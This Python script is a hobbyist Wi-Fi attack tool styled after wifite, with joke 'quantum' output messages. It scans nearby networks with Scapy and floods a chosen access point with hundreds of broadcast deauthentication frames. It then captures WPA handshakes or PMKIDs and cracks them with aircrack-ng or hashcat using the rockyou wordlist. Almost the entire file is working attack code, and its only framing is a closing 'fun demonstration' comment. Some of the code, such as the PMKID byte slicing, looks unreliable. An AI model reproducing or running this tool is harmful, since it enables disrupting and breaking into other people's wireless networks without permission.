#!/usr/bin/env python3
# MTH ABORXS BY Rip70022/craxterpy
# this is my best funny script - this shit is like wifite but better i guess..
#  __  __ _____ _  _      _    ___   ___  ______  _____ 
# |  \/  |_   _| || |    /_\  | _ ) / _ \|  _ \ \/ / __|
# | |\/| | | | | __ |   / _ \ | _ \| (_) | |   >  <\__ \
# |_|  |_| |_| |_||_|  /_/ \_\|___/ \___/|_|  /_/\_\___/
#   > 258 lines OF PURE UNFILTERED CYBER WEAPONRY <
# TESTED ON KALI 1/28/2025 | PYTHON 3.11.6 | SCAPY 2.5.0

import os
import sys
import time
import signal
import subprocess
from threading import Thread, Lock
from queue import Queue
from datetime import datetime
import re
import argparse
import readline
import logging
import sqlite3
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, Dot11Deauth, RadioTap
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# =====================
# CONFIGURATION SECTION
# =====================
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"
HS_DIR = "handshakes"
PMKID_DIR = "pmkids"
DB_NAME = "MTH_ABORXS.db"
LOG_FILE = "blackhole.log"
MAX_DEAUTHS = 600  # FCC violation counter
PMKID_TIMEOUT = 300
HANDSHAKE_TIMEOUT = 600
CRACK_QUEUE = Queue()
TERMINATE = False
LOCK = Lock()

# ====================
# DATABASE INITIALIZATION
# ====================
def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS networks
                     (bssid TEXT, essid TEXT, channel INT, encryption TEXT, 
                      first_seen DATETIME, last_seen DATETIME, 
                      signal INT, handshake BOOLEAN, pmkid BOOLEAN)''')
        c.execute('''CREATE TABLE IF NOT EXISTS clients
                     (mac TEXT, vendor TEXT, bssid TEXT, last_probed DATETIME)''')
        conn.commit()

# ====================
# SIGNAL HANDLERS
# ====================
def sig_handler(sig, frame):
    global TERMINATE
    print("\n[!] Radiation levels critical! Shutting down quantum entanglement...")
    TERMINATE = True
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

# ====================
# CORE CLASSES
# ====================
class QuantumScanner:
    def __init__(self, interface):
        self.interface = interface
        self.networks = {}
        self.clients = {}
        self.channel = 1
        self.hopper = None
        self.socket = None

    def channel_hopper(self):
        while not TERMINATE:
            os.system(f"iwconfig {self.interface} channel {self.channel}")
            self.channel = self.channel % 14 + 1
            time.sleep(0.5)

    def packet_handler(self, packet):
        if packet.haslayer(Dot11Beacon):
            self.process_beacon(packet)
        elif packet.haslayer(Dot11ProbeReq):
            self.process_probe_request(packet)
        elif packet.haslayer(Dot11ProbeResp):
            self.process_probe_response(packet)

    def process_beacon(self, packet):
        bssid = packet[Dot11].addr3
        essid = packet[Dot11Elt].info.decode() if packet[Dot11Elt].info else "<HIDDEN>"
        stats = packet[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        crypto = stats.get("crypto")
        dbm_signal = packet.dBm_AntSignal

        with LOCK:
            if bssid not in self.networks:
                self.networks[bssid] = {
                    'essid': essid,
                    'channel': channel,
                    'crypto': crypto,
                    'first_seen': datetime.now(),
                    'last_seen': datetime.now(),
                    'signal': dbm_signal,
                    'handshake': False,
                    'pmkid': False
                }
            else:
                self.networks[bssid]['last_seen'] = datetime.now()
                self.networks[bssid]['signal'] = dbm_signal

    def start(self):
        self.hopper = Thread(target=self.channel_hopper)
        self.hopper.daemon = True
        self.hopper.start()
        
        print(f"[+] Opening quantum entanglement on {self.interface}...")
        self.socket = conf.L2listen(iface=self.interface)
        sniff(prn=self.packet_handler, store=0, stop_filter=lambda x: TERMINATE)

class Singularity:
    def __init__(self, target_bssid, interface, channel):
        self.target = target_bssid
        self.interface = interface
        self.channel = channel
        self.handshake_file = f"{HS_DIR}/{self.target}_{int(time.time())}.cap"
        self.pmkid_file = f"{PMKID_DIR}/{self.target}_{int(time.time())}.pmkid"
        self.deauth_counter = 0

    def cosmic_blast(self):
        print(f"[+] Initiating supernova collapse on {self.target}...")
        deauth_packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target, addr3=self.target)/Dot11Deauth()
        sendp(deauth_packet, iface=self.interface, count=MAX_DEAUTHS, inter=0.1, verbose=0)
        self.deauth_counter += MAX_DEAUTHS

    def event_horizon(self, packet):
        if packet.haslayer(EAPOL):
            print("[+] Spacetime anomaly detected! Capturing handshake...")
            wrpcap(self.handshake_file, packet, append=True)
        elif packet.haslayer(Dot11Beacon) and packet.haslayer(Dot11Elt):
            if packet[Dot11].addr3 == self.target:
                pmkid = self.extract_pmkid(packet)
                if pmkid:
                    with open(self.pmkid_file, 'w') as f:
                        f.write(f"{self.target}|{pmkid.hex()}")
                    print("[+] Captured PMKID from event horizon!")
                    return True
        return False

    def extract_pmkid(self, packet):
        rsn = packet[Dot11Elt][2].info if packet[Dot11Elt].ID == 48 else None
        if rsn and len(rsn) > 20:
            pmkid = rsn[20:36]
            return pmkid
        return None

    def capture_handshake(self):
        print("[+] Opening wormhole for EAPOL particles...")
        sniff(iface=self.interface, prn=self.event_horizon, stop_filter=lambda x: TERMINATE, timeout=HANDSHAKE_TIMEOUT)

class QuantumCracker:
    def __init__(self, target_file, wordlist=WORDLIST_PATH):
        self.target = target_file
        self.wordlist = wordlist
        self.found = False

    def hccapx_attack(self):
        print("[+] Initiating quantum brute-force through multiverse...")
        cmd = f"aircrack-ng {self.target} -w {self.wordlist} -l {self.target}.key"
        subprocess.run(cmd, shell=True)

    def pmkid_crack(self):
        print("[+] Manipulating spacetime continuum for PMKID attack...")
        cmd = f"hashcat -m 16800 {self.target} {self.wordlist} --force"
        subprocess.run(cmd, shell=True)

# ====================
# UTILITY FUNCTIONS
# ====================
def enable_monitor(interface):
    print(f"[+] Tearing spacetime fabric on {interface}...")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")

def list_interfaces():
    interfaces = subprocess.check_output("iwconfig 2>/dev/null | grep 'IEEE 802.11' | awk '{print $1}'", shell=True).decode().split()
    return interfaces

def select_interface():
    interfaces = list_interfaces()
    print("[+] Available quantum entanglement points:")
    for idx, iface in enumerate(interfaces):
        print(f"{idx + 1}. {iface}")
    selection = int(input("[?] Select interface: ")) - 1
    return interfaces[selection]

def cleanup():
    print("[+] Erasing quantum signatures...")
    os.system("pkill aircrack-ng")
    os.system("pkill hcxdumptool")

# ====================
# MAIN FUNCTIONALITY
# ====================
def main():
    if os.geteuid() != 0:
        print("[-] Quantum manipulation requires singularity access (run as root!)")
        sys.exit(1)

    init_db()
    interface = select_interface()
    enable_monitor(interface)

    scanner = QuantumScanner(interface)
    scanner_thread = Thread(target=scanner.start)
    scanner_thread.start()

    time.sleep(10)
    with LOCK:
        for bssid in scanner.networks:
            net = scanner.networks[bssid]
            print(f"[+] Detected spacetime anomaly: {net['essid']} ({bssid}) on CH{net['channel']}")

    target = input("[?] Enter target BSSID: ")
    channel = scanner.networks[target]['channel']
    
    os.system(f"iwconfig {interface} channel {channel}")
    singularity = Singularity(target, interface, channel)
    singularity.cosmic_blast()
    singularity.capture_handshake()

    if os.path.exists(singularity.handshake_file):
        print("[+] Handshake captured! Initiating quantum decryption...")
        cracker = QuantumCracker(singularity.handshake_file)
        cracker.hccapx_attack()
    elif os.path.exists(singularity.pmkid_file):
        print("[+] PMKID captured! Breaking spacetime encryption...")
        cracker = QuantumCracker(singularity.pmkid_file)
        cracker.pmkid_crack()
    else:
        print("[-] Failed to capture quantum particles. Try increasing entropy.")

if __name__ == "__main__":
    main()
# ====================
# END OF SCRIPT
# ====================
# This script is a fun way to demonstrate how to use Scapy for wireless attacks.
# It combines various techniques such as deauthentication, handshake capture, and PMKID cracking.
